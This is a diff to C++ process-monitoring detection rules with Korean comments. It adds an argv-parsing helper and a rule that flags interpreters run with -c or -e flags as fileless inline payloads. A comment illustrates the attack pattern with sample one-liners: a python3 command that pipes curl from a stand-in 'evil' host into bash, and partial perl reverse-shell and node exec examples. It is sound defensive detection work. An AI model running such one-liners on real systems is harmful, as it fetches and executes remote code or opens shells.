@@ -34,6 +34,25 @@ static bool starts_with(const char *s, const char *prefix)
     return strncmp(s, prefix, strlen(prefix)) == 0;
 }
 
+/*
+ * get_argv_n: NUL 구분 argv 버퍼에서 n번째 인자 포인터 반환.
+ *
+ * process_event.argv 는 /proc/PID/cmdline 과 동일한 형식:
+ *   "argv0\0argv1\0argv2\0..."
+ *
+ * 반환값: n번째 인자 시작 주소, 범위 초과 시 nullptr.
+ */
+static const char *get_argv_n(const char *buf, __u32 n)
+{
+    size_t off = 0;
+    for (__u32 i = 0; i < n; i++) {
+        while (off < MAX_ARGV_LEN && buf[off] != '\0') off++;
+        off++; /* NUL 건너뜀 */
+        if (off >= MAX_ARGV_LEN) return nullptr;
+    }
+    return (off < MAX_ARGV_LEN) ? buf + off : nullptr;
+}
+
 /* null-terminated 문자열 배열에서 comm 검색 (exact match) */
 static bool comm_in(const char *comm, const char * const *list)
 {
@@ -146,6 +165,24 @@ std::vector<RuleMatch> match_rules(const process_event &e)
     /* R-008: root 권한으로 인터프리터 실행 (권한 상승 후 페이로드 실행 의심) */
     if (e.uid == 0 && comm_in(e.comm, INTERPRETERS))
         hits.push_back({"R-008", "root 권한 인터프리터 실행", "critical"});
+
+    /*
+     * R-010: 인터프리터 + -c 플래그 (인라인 페이로드 실행).
+     *
+     * 공격 패턴:
+     *   python3 -c "import os; os.system('curl http://evil/sh | bash')"
+     *   perl -e 'use Socket; ...'   # 리버스셸 원라이너
+     *   node -e 'require("child_process").exec(...)'
+     *
+     * -c / -e 플래그는 인터프리터가 스크립트 파일 없이 인라인 코드를 실행하게 하므로
+     * 파일리스(fileless) 공격의 핵심 지표다.
+     * argv[1] (comm 다음 첫 인자)에서 이를 감지한다.
+     */
+    if (comm_in(e.comm, INTERPRETERS) && e.argc >= 2) {
+        const char *arg1 = get_argv_n(e.argv, 1);
+        if (arg1 && (strcmp(arg1, "-c") == 0 || strcmp(arg1, "-e") == 0))
+            hits.push_back({"R-010", "인터프리터 인라인 페이로드 (-c/-e 플래그)", "high"});
+    }
 
     return hits;
 }
